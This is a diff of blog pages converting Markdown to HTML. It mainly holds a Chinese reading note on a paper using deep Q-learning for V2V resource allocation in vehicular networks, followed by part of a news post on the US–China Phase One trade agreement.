+<p>现存的一些分布式的资源分配方式的问题是他们考虑的一般是单播通信(Unicast)，而非广播过程。广播通信模式中的广播风暴也是资源分配机制需要考虑的问题。传统的方法一般用随机转发或者是基于拓扑信息管理转发的方法来解决这个问题。</p>
+<p>上面讨论的是中心时和分布式的资源分配方式存在的问题。下面讨论的是更加细节的问题。</p>
+<p>在现有的研究中，V2V链路的QoS值包含了SINR这一个指标，延时限制这个指标不太好建模进入优化问题，因此没有被充分考虑。</p>
+<p>为了解决上述这些问题，作者提出使用深度增强学习来解决单播和广播通信中的资源分配问题。作者主要用深度增强学习来研究从本地观测量，如CSI（信道状态信息），干扰水平等，和资源分配和调度方案之间的映射关系。在单播通信中，每个V2V链路被视为一个agent(代理)，频谱和传输功率为待控制的量。在广播通信中，每个节点被视为一个agent，待控制量为频谱和消息(messages)。Observation, action还有reward function都根据单播和广播做了单独的设计。</p>
+<h1 data-number="3" id="系统模型unicast"><span class="header-section-number">3</span> 系统模型(Unicast)</h1>
+<p><img src="https://imgs.codewoody.com/uploads/big/e98332816ed0c02b3cd7e6e8185d676a.png"></p>
+<p>如上图所示，车联网中包含 <span class="math inline">\(M\)</span> 个基站用户(CUEs)，标记为<span class="math inline">\(\mathcal{M} = \{1, 2, \dots, M\}\)</span>以<span class="math inline">\(K\)</span>对V2V用户(VUEs)，记为<span class="math inline">\(\mathcal{K} = \{1, 2, \dots, K\}\)</span>，CUEs需要V2I链路来支撑和基站(BS)的通信，而VUEs需要V2V连接来共享交通安全管理相关的信息。为了改善频谱利用效率，我们假设为V2I上行链路正交分配的频谱是和V2V链路共享的，这是因为在基站处的干扰情况要更加可控一些，而且上行链路的负载要低很多。</p>
+<p>第<span class="math inline">\(m^{th}\)</span>个CUE的SINR为</p>
+<p><span class="math display">\[
 \gamma^{c}[m] = \frac{P_m^c h_m}{\sigma^2 + \sum_{k \in \mathcal{K}}\rho_k[m]P_{k}^{v}h_k}
-$$
-
-其中$P_{m}^c$和$P_{k}^{v}$表示第$m^{th}$个CUE和第$k^{th}$个VUE设备的发射功率，$\sigma^2$为噪声功率，$h_m$为对$m^{th}$CUE的信道增益。$\rho_{k}[m]$为表示频谱分配的指示函数。如果$k^{th}$ VUE使用了$m^{th}$ CUE的频谱，那么$\rho_k[m] = 1$。那么根据香农定义，$m^{th}$ CUE的信道容量是
-
-$$
+\]</span></p>
+<p>其中<span class="math inline">\(P_{m}^c\)</span>和<span class="math inline">\(P_{k}^{v}\)</span>表示第<span class="math inline">\(m^{th}\)</span>个CUE和第<span class="math inline">\(k^{th}\)</span>个VUE设备的发射功率，<span class="math inline">\(\sigma^2\)</span>为噪声功率，<span class="math inline">\(h_m\)</span>为对<span class="math inline">\(m^{th}\)</span>CUE的信道增益。<span class="math inline">\(\rho_{k}[m]\)</span>为表示频谱分配的指示函数。如果<span class="math inline">\(k^{th}\)</span> VUE使用了<span class="math inline">\(m^{th}\)</span> CUE的频谱，那么<span class="math inline">\(\rho_k[m] = 1\)</span>。那么根据香农定义，<span class="math inline">\(m^{th}\)</span> CUE的信道容量是</p>
+<p><span class="math display">\[
 C^{c}[m] = W \cdot \log (1 + \gamma^c[m])
-$$
-
-其中$W$为信道带宽。
-
-类似对于$k^{th}$ VUE也可以给出其SINR
-
-$$
+\]</span></p>
+<p>其中<span class="math inline">\(W\)</span>为信道带宽。</p>
+<p>类似对于<span class="math inline">\(k^{th}\)</span> VUE也可以给出其SINR</p>
+<p><span class="math display">\[
 \gamma^v[k] = \frac{P_k^v \cdot g_k}{\sigma^2 + G_c + G_d}
-$$
-
-其中
-
-$$
+\]</span></p>
+<p>其中</p>
+<p><span class="math display">\[
 G_c = \sum_{m \in \mathcal{M}} \rho_{k}[m] P_m^c \tilde{g}_{m, k}
-$$
-
-为CUE的V2I上行链路对VUE的干扰。
-
-$$
-G_d = \sum_{m \in \mathcal{M}} \sum_{k' \in \mathcal{K}  k \neq k'} \rho_{k}[m] \rho_{k'}[m] P_{k'}^v \tilde{g}_{k',k}^{v}
-$$
-
-这个是V2V链路的整体干扰水平。$g_k$为$k^{th}$的功率增益，$\tilde{g}_{k, m}$为 $m^{th}$ CUE的干扰功率增益。$\tilde{g}^v_{k', k}$为$k^{th}$的干扰功率增益。那么类似的通过香农公式，我们可以得到$k%{thi}$ VUE的信道容量。
-
-$$
+\]</span></p>
+<p>为CUE的V2I上行链路对VUE的干扰。</p>
+<p><span class="math display">\[
+G_d = \sum_{m \in \mathcal{M}} \sum_{k&#39; \in \mathcal{K}  k \neq k&#39;} \rho_{k}[m] \rho_{k&#39;}[m] P_{k&#39;}^v \tilde{g}_{k&#39;,k}^{v}
+\]</span></p>
+<p>这个是V2V链路的整体干扰水平。<span class="math inline">\(g_k\)</span>为<span class="math inline">\(k^{th}\)</span>的功率增益，<span class="math inline">\(\tilde{g}_{k, m}\)</span>为 <span class="math inline">\(m^{th}\)</span> CUE的干扰功率增益。<span class="math inline">\(\tilde{g}^v_{k&#39;, k}\)</span>为<span class="math inline">\(k^{th}\)</span>的干扰功率增益。那么类似的通过香农公式，我们可以得到<span class="math inline">\(k%{thi}\)</span> VUE的信道容量。</p>
+<p><span class="math display">\[
 C^{v}[k] = W \cdot \log (1 + \gamma^{v}[k])
-$$
-
-V2V的通信具有比较严格的延时和可靠性要求，而数据率则并没有那么重要。这里延时和可靠性要求被转化成中断概率(<i>Outage probabilities</i>)。通过深度学习，这些限制因素被直接转化成奖励函数。相反，对于V2I通信来说，蜂窝通信中延时的重要性没有那么高，传统的分配策略中强调最大化吞吐率的思想仍然适用。故V2I的数据率总和仍然会体现在奖励函数中。
-
-由于BS没有V2V链路的信息，因此V2I的资源分配流程要和V2V的资源管理流程独立。在给定V2I的链路分配的情况下，这篇文章提出的资源管理机制的目标是确保满足V2V链路的延时要求，同时最小化V2V通信对于V2I链路的影响。在分布式的场景下，V2V链路只能根据本地信息来选择RB并设置传输功率。
-
-这些本地信息中，第一种是对于信道和干扰信息的观测。这里假设sub-channel的数量和V2I的链路的数量$M$相等。对应的V2V链路的瞬时信道信息, $G_{t}[m], m \in \mathcal{M}$，为对应的sub-channel的功率增益。上一个时时隙收到的信号强度是 $I_{t - 1}[m], m \in \mathcal{M}$, 代表了在每个信道上的干扰强度。每个链路的本地观测信息还包含了邻居节点之间共享的信息，例如在前一个时隙上邻居节点选择的信道$N_{t - 1}[m]$，这个数值代表了邻居节点选用了某个子信道的次数。另外，本地观测还需要包含已经传输的消息的状态信息，例如还未发送完消息载荷$L_t$（代表剩余比特数的百分比），以及距离违反延时限制还剩余的时间窗口$U_t$。上述的本地信息包括$H_t[m], I_{t - 1}[m], N_{t - 1}[m], L_t, U_t$， 这些消息在之后的广播通信场景中也会使用。
-
-现在的问题就是如何从这些观测量出发得到最优的资源分配策略。这篇文章在这个问题上使用了深度强化学习工具。
-
-## 深度强化学习
-
-### 强化学习
-
-![](https://imgs.codewoody.com/uploads/big/cc6e152d9b1b8a14c4407e573c966496.png)
-
-如上图所示，一个典型的强化学习的框架包括代理(Agent)与环境，及其交互。在本文的模型中，每个V2V链路被视为一个代理，除此之外都是环境的一部分。在去中心化场景中别的代理的决策是不可控的，因此每个代理的行为只基于其本身的状态集。
-
-在上图中，在每个时刻$t$，V2V链路，即代理，观察得到一个状态值$\mathbf{s}_{t}$，并从行为空间$\mathcal{A}$中，基于政策$\pi$选择一个sub-band和一个传输功率。这里政策$\pi$可以通过状态-行为函数来确定，这个函数也被称为Q函数，$Q(\mathbf{s}_t, a_t)$，这个函数可以通过深度学习来估计。基于代理选择的行为，环境会反馈新的状态，$\mathbf{s}_{t+1}$，而每个代理会收到一个奖励$r_t$。在本文的场景下，奖励取决于V2I和V2V的传输能力以及V2V链路是否满足了延时要求。
-
-在前一个部分的讨论中提到，环境中可观测的要素包括如下几部分：即时信道信息, $\mathbf{G}_t = (G_t[1], \dots, G_{t}[M])$，前一个时刻干扰功率，$\mathbf{I}_{t - 1} = (I_{t - 1}[1], \dots, I_{t - 1}[M])$，V2I链路的信道信息$\mathbf{H}_t = (H_t[1], \dots, H_t[M])$，邻居节点选择的信道信息$\mathbf{N}_{t - 1} = (N_{t - 1}[1], \dots, N_{t - 1}[M])$，当前尚未传输完成的业务负载$L_{t}$，以及距离超出延时限制还剩下的时间$U_t$。尽管状态信息包含了异构的数据，后面我们可以看到使用深度神经网络，我们可以从异构数据中提取出有用的信息，并用于学习出最优的政策。综上，状态向量可以表示成
-
-$$
+\]</span></p>
+<p>V2V的通信具有比较严格的延时和可靠性要求，而数据率则并没有那么重要。这里延时和可靠性要求被转化成中断概率(<i>Outage probabilities</i>)。通过深度学习，这些限制因素被直接转化成奖励函数。相反，对于V2I通信来说，蜂窝通信中延时的重要性没有那么高，传统的分配策略中强调最大化吞吐率的思想仍然适用。故V2I的数据率总和仍然会体现在奖励函数中。</p>
+<p>由于BS没有V2V链路的信息，因此V2I的资源分配流程要和V2V的资源管理流程独立。在给定V2I的链路分配的情况下，这篇文章提出的资源管理机制的目标是确保满足V2V链路的延时要求，同时最小化V2V通信对于V2I链路的影响。在分布式的场景下，V2V链路只能根据本地信息来选择RB并设置传输功率。</p>
+<p>这些本地信息中，第一种是对于信道和干扰信息的观测。这里假设sub-channel的数量和V2I的链路的数量<span class="math inline">\(M\)</span>相等。对应的V2V链路的瞬时信道信息, <span class="math inline">\(G_{t}[m], m \in \mathcal{M}\)</span>，为对应的sub-channel的功率增益。上一个时时隙收到的信号强度是 <span class="math inline">\(I_{t - 1}[m], m \in \mathcal{M}\)</span>, 代表了在每个信道上的干扰强度。每个链路的本地观测信息还包含了邻居节点之间共享的信息，例如在前一个时隙上邻居节点选择的信道<span class="math inline">\(N_{t - 1}[m]\)</span>，这个数值代表了邻居节点选用了某个子信道的次数。另外，本地观测还需要包含已经传输的消息的状态信息，例如还未发送完消息载荷<span class="math inline">\(L_t\)</span>（代表剩余比特数的百分比），以及距离违反延时限制还剩余的时间窗口<span class="math inline">\(U_t\)</span>。上述的本地信息包括<span class="math inline">\(H_t[m], I_{t - 1}[m], N_{t - 1}[m], L_t, U_t\)</span>， 这些消息在之后的广播通信场景中也会使用。</p>
+<p>现在的问题就是如何从这些观测量出发得到最优的资源分配策略。这篇文章在这个问题上使用了深度强化学习工具。</p>
+<h1 data-number="4" id="深度强化学习"><span class="header-section-number">4</span> 深度强化学习</h1>
+<h2 data-number="4.1" id="强化学习"><span class="header-section-number">4.1</span> 强化学习</h2>
+<p><img src="https://imgs.codewoody.com/uploads/big/cc6e152d9b1b8a14c4407e573c966496.png"></p>
+<p>如上图所示，一个典型的强化学习的框架包括代理(Agent)与环境，及其交互。在本文的模型中，每个V2V链路被视为一个代理，除此之外都是环境的一部分。在去中心化场景中别的代理的决策是不可控的，因此每个代理的行为只基于其本身的状态集。</p>
+<p>在上图中，在每个时刻<span class="math inline">\(t\)</span>，V2V链路，即代理，观察得到一个状态值<span class="math inline">\(\mathbf{s}_{t}\)</span>，并从行为空间<span class="math inline">\(\mathcal{A}\)</span>中，基于政策<span class="math inline">\(\pi\)</span>选择一个sub-band和一个传输功率。这里政策<span class="math inline">\(\pi\)</span>可以通过状态-行为函数来确定，这个函数也被称为Q函数，<span class="math inline">\(Q(\mathbf{s}_t, a_t)\)</span>，这个函数可以通过深度学习来估计。基于代理选择的行为，环境会反馈新的状态，<span class="math inline">\(\mathbf{s}_{t+1}\)</span>，而每个代理会收到一个奖励<span class="math inline">\(r_t\)</span>。在本文的场景下，奖励取决于V2I和V2V的传输能力以及V2V链路是否满足了延时要求。</p>
+<p>在前一个部分的讨论中提到，环境中可观测的要素包括如下几部分：即时信道信息, <span class="math inline">\(\mathbf{G}_t = (G_t[1], \dots, G_{t}[M])\)</span>，前一个时刻干扰功率，<span class="math inline">\(\mathbf{I}_{t - 1} = (I_{t - 1}[1], \dots, I_{t - 1}[M])\)</span>，V2I链路的信道信息<span class="math inline">\(\mathbf{H}_t = (H_t[1], \dots, H_t[M])\)</span>，邻居节点选择的信道信息<span class="math inline">\(\mathbf{N}_{t - 1} = (N_{t - 1}[1], \dots, N_{t - 1}[M])\)</span>，当前尚未传输完成的业务负载<span class="math inline">\(L_{t}\)</span>，以及距离超出延时限制还剩下的时间<span class="math inline">\(U_t\)</span>。尽管状态信息包含了异构的数据，后面我们可以看到使用深度神经网络，我们可以从异构数据中提取出有用的信息，并用于学习出最优的政策。综上，状态向量可以表示成</p>
+<p><span class="math display">\[
 \mathbf{s}_{\mathbf{t}}=\left\{\boldsymbol{I}_{\boldsymbol{t}-\mathbf{1}}, \boldsymbol{H}_{\boldsymbol{t}}, \boldsymbol{N}_{\boldsymbol{t}-\mathbf{1}}, \boldsymbol{G}_{\boldsymbol{t}}, U_{t}, L_{t}\right\}
-$$
-
-这里传输功率被离散化为三个档，因此行为空间的大小为$3 \times N_{RB}$，其中$N_{RB}$为RB资源的数量。
-
-V2V资源调度的目标如下：
-
-一个代理(V2V链路)选择频带和传输功率，使其对所有的V2I链路和其他V2V的链路干扰很小，同时保留足够的资源以满足延时要求。因此，用来指导学习过程的奖励函数设计应该与这一目标保持一致。在本文的框架中，奖励函数由三部分组成，分别是V2I链路的能力，V2V链路的能力，以及延时条件。V2V和V2I链路能力的总和用来度量代理的选择对于V2I和其他V2V链路的干扰。延时条件被构建为一个惩罚项目。具体而言，奖励函数如下：
-
+\]</span></p>
+<p>这里传输功率被离散化为三个档，因此行为空间的大小为<span class="math inline">\(3 \times N_{RB}\)</span>，其中<span class="math inline">\(N_{RB}\)</span>为RB资源的数量。</p>
+<p>V2V资源调度的目标如下：</p>
+<p>一个代理(V2V链路)选择频带和传输功率，使其对所有的V2I链路和其他V2V的链路干扰很小，同时保留足够的资源以满足延时要求。因此，用来指导学习过程的奖励函数设计应该与这一目标保持一致。在本文的框架中，奖励函数由三部分组成，分别是V2I链路的能力，V2V链路的能力，以及延时条件。V2V和V2I链路能力的总和用来度量代理的选择对于V2I和其他V2V链路的干扰。延时条件被构建为一个惩罚项目。具体而言，奖励函数如下：</p>
 <div style="border: 1px solid black; padding-top: 15px">
-$$
+<p><span class="math display">\[
 r_{t}=\lambda_{c} \sum_{m \in \mathcal{M}} C^{c}[m]+\lambda_{d} \sum_{k \in \mathcal{K}} C^{v}[k]-\lambda_{p}\left(T_{0}-U_{t}\right)
-$$
+\]</span></p>
 </div>
-
-其中$T_{0}$为最大容许延时。$\lambda_c, \lambda_d$和$\lambda_p$为三部分的权重值。$T_0 - U_t$为已经用于传输的时间长度，即惩罚项目会随着传输时间的增长而增长。为了在长时间尺度上获得好的表现，需要同时考虑即时收益与未来的收益。因此，这里的强化学习优化的目标是寻找是的下面的累积奖励最大化
-
-$$
+<p>其中<span class="math inline">\(T_{0}\)</span>为最大容许延时。<span class="math inline">\(\lambda_c, \lambda_d\)</span>和<span class="math inline">\(\lambda_p\)</span>为三部分的权重值。<span class="math inline">\(T_0 - U_t\)</span>为已经用于传输的时间长度，即惩罚项目会随着传输时间的增长而增长。为了在长时间尺度上获得好的表现，需要同时考虑即时收益与未来的收益。因此，这里的强化学习优化的目标是寻找是的下面的累积奖励最大化</p>
+<p><span class="math display">\[
 R_{t} = \mathbb{E}\left[
   \sum_{n = 0}^{\infty} \beta^n r_{t + n}
   \right]
-$$
-
-其中$\beta \in [0, 1]$为述案件系数。
-
-这里系统模型为[MDP模型](/knowledge-base/academic/ml/reinforcement-learning/#%E6%9C%89%E9%99%90%E9%A9%AC%E5%B0%94%E7%A7%91%E5%A4%AB%E5%86%B3%E7%AD%96%E8%BF%87%E7%A8%8B)。状态$\mathbf{s}_t$ 在行为$a_t$下转移到$\mathbf{s}_{t+1}$并获得奖励$r_t$的概率为$p(\mathbf{s}_{t+1}, r_t|\mathbf{s}_t, a_t)$。注意代理能够控制行为选择，但是对于这个转移概率$\mathbf{P} = \{\mathbf{s}_{t+1}, r_t|\mathbf{s}_t, a_t)\}$没有先验信息，这一概率完全由环境因素决定
-
-### 深度Q学习
-
-代理基于政策$\pi$选择合适的行为，政策是从状态空间$\mathcal{S}$到行为空间$\mathcal{A}$的映射：$\pi: \mathbf{s}_t \in \mathcal{S} \rightarrow a_t \in \mathcal{A}$。Q学习算法可以用来获取最优的政策。对于给定的状态行为对$(\mathbf{s}_t, a_t)$，$Q(\mathbf{s}_t, a_t)$表示累积奖励$R_t$的期望。因此Q值可以用来评估在某一个状态下采取某一行为的好坏。当$Q(\mathbf{s}_t, a_t)$已知时，我们可以很容易地改进策略：
-
-$$
+\]</span></p>
+<p>其中<span class="math inline">\(\beta \in [0, 1]\)</span>为述案件系数。</p>
+<p>这里系统模型为<a href="/knowledge-base/academic/ml/reinforcement-learning/#%E6%9C%89%E9%99%90%E9%A9%AC%E5%B0%94%E7%A7%91%E5%A4%AB%E5%86%B3%E7%AD%96%E8%BF%87%E7%A8%8B">MDP模型</a>。状态<span class="math inline">\(\mathbf{s}_t\)</span> 在行为<span class="math inline">\(a_t\)</span>下转移到<span class="math inline">\(\mathbf{s}_{t+1}\)</span>并获得奖励<span class="math inline">\(r_t\)</span>的概率为<span class="math inline">\(p(\mathbf{s}_{t+1}, r_t|\mathbf{s}_t, a_t)\)</span>。注意代理能够控制行为选择，但是对于这个转移概率<span class="math inline">\(\mathbf{P} = \{\mathbf{s}_{t+1}, r_t|\mathbf{s}_t, a_t)\}\)</span>没有先验信息，这一概率完全由环境因素决定</p>
+<h2 data-number="4.2" id="深度q学习"><span class="header-section-number">4.2</span> 深度Q学习</h2>
+<p>代理基于政策<span class="math inline">\(\pi\)</span>选择合适的行为，政策是从状态空间<span class="math inline">\(\mathcal{S}\)</span>到行为空间<span class="math inline">\(\mathcal{A}\)</span>的映射：<span class="math inline">\(\pi: \mathbf{s}_t \in \mathcal{S} \rightarrow a_t \in \mathcal{A}\)</span>。Q学习算法可以用来获取最优的政策。对于给定的状态行为对<span class="math inline">\((\mathbf{s}_t, a_t)\)</span>，<span class="math inline">\(Q(\mathbf{s}_t, a_t)\)</span>表示累积奖励<span class="math inline">\(R_t\)</span>的期望。因此Q值可以用来评估在某一个状态下采取某一行为的好坏。当<span class="math inline">\(Q(\mathbf{s}_t, a_t)\)</span>已知时，我们可以很容易地改进策略：</p>
+<p><span class="math display">\[
 a_t = \underset{a}{\arg \max } Q(\mathbf{s}_t, a_t)
-$$
-
-具有最佳的Q值$Q^*$的最优策略可以根据下面的更新策略在不具备关于系统的先验知识的情况下得到：
-
-$$
+\]</span></p>
+<p>具有最佳的Q值<span class="math inline">\(Q^*\)</span>的最优策略可以根据下面的更新策略在不具备关于系统的先验知识的情况下得到：</p>
+<p><span class="math display">\[
 \begin{aligned}
-Q_{n e w}\left(\mathbf{s}_{\mathbf{t}}, a_{t}\right)=& Q_{\text {old}}\left(\mathbf{s}_{\mathbf{t}}, a_{t}\right)+\alpha\left[r_{t+1}\right.\\
-&\left.+\beta \max _{\mathbf{s} \in \mathcal{S}} Q_{\text {old}}\left(\mathbf{s}, a_{t}\right)-Q_{\text {old}}\left(\mathbf{s}_{\mathbf{t}}, a_{t}\right)\right]
+Q_{n e w}\left(\mathbf{s}_{\mathbf{t}}, a_{t}\right)=&amp; Q_{\text {old}}\left(\mathbf{s}_{\mathbf{t}}, a_{t}\right)+\alpha\left[r_{t+1}\right.\\
+&amp;\left.+\beta \max _{\mathbf{s} \in \mathcal{S}} Q_{\text {old}}\left(\mathbf{s}, a_{t}\right)-Q_{\text {old}}\left(\mathbf{s}_{\mathbf{t}}, a_{t}\right)\right]
 \end{aligned}
-$$
-
-其中$\alpha$为Learning rate。上式中的第二项为更新Q值的差值，当$Q$已经是最优时，这一项会为0。根据Sutton的<i>Reinoforcement Learning: An Introduction</i>这本书，如果在无限迭代中，如果在每个状态下每个行为都能够被执行无限次，且Learning rate适当的进行衰减，那么上式一定能够收敛到$Q^*$。而当$Q^*$确定以后，即可确定最优的政策。
-
-当行为-状态空间比较小时，可以使用一些经典的方法来解决Q学习问题，甚至可以用列表的方法来维护Q函数。不过如果状态空间非常大，甚至是无限时，这种经典的方法就不可用了。除了计算成本方面的考虑，由于行为-状态空间很大，为了充分遍历需要更长的迭代时间才能确保Q函数收敛。为了解决这个问题在Q学习中，将的深度神经网络技术结合进来。如下图所示
-
-![](https://imgs.codewoody.com/uploads/big/9fe6971082bdeb85a3859cc580a2c68d.png)
-
-这里使用一个深度神经网络来估计实际的Q函数，这个深度神经网络称为Q网络，参数集合为$\mathbf{\theta}$，网络接受状态输入，并输出在该状态下每个行为选择对应的Q值。剩下的问题是如何更新网络的参数。定义损失函数：
-
-$$
+\]</span></p>
+<p>其中<span class="math inline">\(\alpha\)</span>为Learning rate。上式中的第二项为更新Q值的差值，当<span class="math inline">\(Q\)</span>已经是最优时，这一项会为0。根据Sutton的<i>Reinoforcement Learning: An Introduction</i>这本书，如果在无限迭代中，如果在每个状态下每个行为都能够被执行无限次，且Learning rate适当的进行衰减，那么上式一定能够收敛到<span class="math inline">\(Q^*\)</span>。而当<span class="math inline">\(Q^*\)</span>确定以后，即可确定最优的政策。</p>
+<p>当行为-状态空间比较小时，可以使用一些经典的方法来解决Q学习问题，甚至可以用列表的方法来维护Q函数。不过如果状态空间非常大，甚至是无限时，这种经典的方法就不可用了。除了计算成本方面的考虑，由于行为-状态空间很大，为了充分遍历需要更长的迭代时间才能确保Q函数收敛。为了解决这个问题在Q学习中，将的深度神经网络技术结合进来。如下图所示</p>
+<p><img src="https://imgs.codewoody.com/uploads/big/9fe6971082bdeb85a3859cc580a2c68d.png"></p>
+<p>这里使用一个深度神经网络来估计实际的Q函数，这个深度神经网络称为Q网络，参数集合为<span class="math inline">\(\mathbf{\theta}\)</span>，网络接受状态输入，并输出在该状态下每个行为选择对应的Q值。剩下的问题是如何更新网络的参数。定义损失函数：</p>
+<p><span class="math display">\[
 Loss(\mathbf{\theta}) = \sum_{(\mathbf{s}_t, a_t) \in D} (y - Q(\mathbf{s}_t, a_t, \mathbf{\theta}))^2
-$$
-
-这里$D$为数据集，
-
-$$
+\]</span></p>
+<p>这里<span class="math inline">\(D\)</span>为数据集，</p>
+<p><span class="math display">\[
 y = r_t + \max_{a \in \mathcal{A}} Q_{old} (\mathbf{s}_t, a, \mathbf{\theta})
-$$
-
-### 模型训练与测试 
-
-如同众多的机器学习算法，这里的方法的也分为训练和测试两个阶段。训练数据和测试数据都是通过环境（仿真系统模拟出来的）和代理的交互过程中产生的。每个训练样本包括$\mathbf{s}_t, \mathbf{s}_{t+1}, a_t, r_t$。环境模拟器包括VUE，CUE及信道，车联的位置随机生成。V2V以及V2I的链路的CSI信息根据车辆的位置生成。在给定V2V的频谱和功率选择之后，环境模拟器负责给出$\mathbf{s}_{t+1}$和$r_t$。在训练阶段，深度Q学习使用了经验回放(Experience replay)功能，其中训练数据被生成并存储到内存中。如下面的算法所示：
-
-![](https://imgs.codewoody.com/uploads/big/2699b940e80146d6cff67f82e3c1876c.png)
-
-在每轮迭代中，从内存中提取一个mini-batch用于更新Q网络。这种方法可以消除生成训练数据的时间相关性。
-
-> Q 函数的输入是状态和代理的行为，输出是奖励和下一个状态。因此本质上来讲 Q 函数是对于环境特征的估计。基于MDP假设，Q函数应该是和时间无关的，只取决于当前的系统状态。因此这里mini-batch的做法应该是从历史数据中随机提取任意时间片采样的组合进行训练，从而避免连续的生成数据对于模型产生影响。
->
-> MDP看起来是一个比较特殊的问题类型，但是事实上只要状态向量定义合适，理论上可以把任意问题建模成MDP问题，当然，不同的问题的复杂度会截然不同。例如AlphaGo这种算法，用MDP建模就会非常复杂。
->
-> 之前在看一个介绍强化学习的视频的时候听过，强化学习的一个主要挑战是奖励的稀疏性。这个稀疏性是指代理并非能在每个行为选择后才能获得奖励，可能要非常多步数之后才能获得奖励。那么在实际的奖励之间的空挡如何引导模型就是一个大问题。不过这篇文章面临的问题要简单很多，奖励都是即时的。
-
-测试阶段的算法如下：
-
-![](https://imgs.codewoody.com/uploads/big/54bc27c9a000ea8c25fe505f15401975.png)
-
-在测试过程中，代理总是选择Q网络给出的Q值最大的行为。
-
-由于每个代理是使用自己的本地信息独立的选择的行为，因此每个V2V链路观察到的状态就无法充分的代表环境的特点<span class="foot-note-span">【应该是每个节点的选择会影响到其他节点的观测】</span>。为了解决这个问题，文章这里要求每个节点只能异步地更新其行为，即同时只有一个或者小部分节点能够同时更新其政策。
-
-另外，异步决策可以让节点之间能够互相观测对方的行为，可以降低冲突的概率。
-
-> 这种轮流决策的方式在节点较多时会非常的低效。
->
-> 另外这里作者选择的策略模型是确定性策略，如果使用随机政策模型，然后使用分布式决策，是否可以实现同步决策呢？
+\]</span></p>
+<h2 data-number="4.3" id="模型训练与测试"><span class="header-section-number">4.3</span> 模型训练与测试</h2>
+<p>如同众多的机器学习算法，这里的方法的也分为训练和测试两个阶段。训练数据和测试数据都是通过环境（仿真系统模拟出来的）和代理的交互过程中产生的。每个训练样本包括<span class="math inline">\(\mathbf{s}_t, \mathbf{s}_{t+1}, a_t, r_t\)</span>。环境模拟器包括VUE，CUE及信道，车联的位置随机生成。V2V以及V2I的链路的CSI信息根据车辆的位置生成。在给定V2V的频谱和功率选择之后，环境模拟器负责给出<span class="math inline">\(\mathbf{s}_{t+1}\)</span>和<span class="math inline">\(r_t\)</span>。在训练阶段，深度Q学习使用了经验回放(Experience replay)功能，其中训练数据被生成并存储到内存中。如下面的算法所示：</p>
+<p><img src="https://imgs.codewoody.com/uploads/big/2699b940e80146d6cff67f82e3c1876c.png"></p>
+<p>在每轮迭代中，从内存中提取一个mini-batch用于更新Q网络。这种方法可以消除生成训练数据的时间相关性。</p>
+<blockquote>
+<p>Q 函数的输入是状态和代理的行为，输出是奖励和下一个状态。因此本质上来讲 Q 函数是对于环境特征的估计。基于MDP假设，Q函数应该是和时间无关的，只取决于当前的系统状态。因此这里mini-batch的做法应该是从历史数据中随机提取任意时间片采样的组合进行训练，从而避免连续的生成数据对于模型产生影响。</p>
+<p>MDP看起来是一个比较特殊的问题类型，但是事实上只要状态向量定义合适，理论上可以把任意问题建模成MDP问题，当然，不同的问题的复杂度会截然不同。例如AlphaGo这种算法，用MDP建模就会非常复杂。</p>
+<p>之前在看一个介绍强化学习的视频的时候听过，强化学习的一个主要挑战是奖励的稀疏性。这个稀疏性是指代理并非能在每个行为选择后才能获得奖励，可能要非常多步数之后才能获得奖励。那么在实际的奖励之间的空挡如何引导模型就是一个大问题。不过这篇文章面临的问题要简单很多，奖励都是即时的。</p>
+</blockquote>
+<p>测试阶段的算法如下：</p>
+<p><img src="https://imgs.codewoody.com/uploads/big/54bc27c9a000ea8c25fe505f15401975.png"></p>
+<p>在测试过程中，代理总是选择Q网络给出的Q值最大的行为。</p>
+<p>由于每个代理是使用自己的本地信息独立的选择的行为，因此每个V2V链路观察到的状态就无法充分的代表环境的特点<span class="foot-note-span">【应该是每个节点的选择会影响到其他节点的观测】</span>。为了解决这个问题，文章这里要求每个节点只能异步地更新其行为，即同时只有一个或者小部分节点能够同时更新其政策。</p>
+<p>另外，异步决策可以让节点之间能够互相观测对方的行为，可以降低冲突的概率。</p>
+<blockquote>
+<p>这种轮流决策的方式在节点较多时会非常的低效。</p>
+<p>另外这里作者选择的策略模型是确定性策略，如果使用随机政策模型，然后使用分布式决策，是否可以实现同步决策呢？</p>
+</blockquote>
 
           
         
@@ -1988,102 +1872,88 @@ $$
       
         
           
-            
-## 新闻
+            <h1 data-number="1" id="新闻"><span class="header-section-number">1</span> 新闻</h1>
+<h2 data-number="1.1" id="中美签署贸易战第一阶段协议"><span class="header-section-number">1.1</span> 中美签署贸易战第一阶段协议</h2>
+<p>这意味着近两年来拖累全球经济的贸易战暂告一个段落，而美国对大部分中国输美商品加征的关税则维持不变。周三在白宫签署所谓的第一阶段协议之前，漫长的美中经贸冲突曾引发全球市场焦虑，并给企业带来不确定性。</p>
+<p>协议全文 94 页（<a href="http://103.78.124.74:81/2Q2W191F46ABF384979D28B01DEDE17C6AF9E671666B_unknown_4F327C5A68A8BAAC21C97C814446427060F434D5_4/images.mofcom.gov.cn/www/202001/20200116104122611.pdf" target="_blank" rel="noopener">中</a>，<a href="https://assets.bwbx.io/documents/users/iqjWHBFdfxIU/rVaHxDBUtdew/v0" target="_blank" rel="noopener">英</a>），一些重点：</p>
+<ul>
+<li>前 16 页详细规定了保护知识产权的力度，对窃取商业机密行为作出刑事处罚。中国将在签署后 30 工作日内公布“增强知识产权保护的行动方案，以支持其高质量增长”。</li>
+<li>双方不得以市场准入相关门槛、合营并购等投资行为，强迫另外一方转让技术。</li>
+<li>2020-2021 年两年间，中国将从美国增加采购 2000 亿美元商品，包括 777 亿美元制造业商品、320 亿美元农产品、524 亿美元能源产品、379 亿美元服务业产品。增加是指在 2017 年贸易战爆发前基础上增加。</li>
+<li>双方互加关税没有消除。去年年底宣布达成协议时暂停增加的<a href="https://www.qdaily.com/articles/64246.html" target="_blank" rel="noopener">惩罚性关税</a>将继续暂停下去——-原定 12 月 15 日，美国对 1600 亿美元中国产手机、电脑、玩具等商品增加关税、中国对美国产汽车等商品增加关税。此外美国自 9 月 1 日起对 1200 亿中国商品加税幅度减半至 7.5%。但大部分已经执行的加税（美对中 2500 亿、中对美 1100 亿）没有取消。</li>
+</ul>
+<p>协议覆盖了一些已经在早先宣布的内容，比如双方遵循 G20 期间宣布的不以价格竞争为目的而贬值货币的承诺、中国对外开放银行、保险、资产管理等金融市场。</p>
+<p>特朗普现场称关税问题可以在第二阶段协议里一次性解决。刘鹤现场宣读中国国家主席习近平的信，敦促美国公平对待中国公司、保护双方大学等机构的持续合作。签约仪式和双方演讲有<a href="https://www.youtube.com/watch?v=3jA4rgUHgqA" target="_blank" rel="noopener">全程直播</a>。</p>
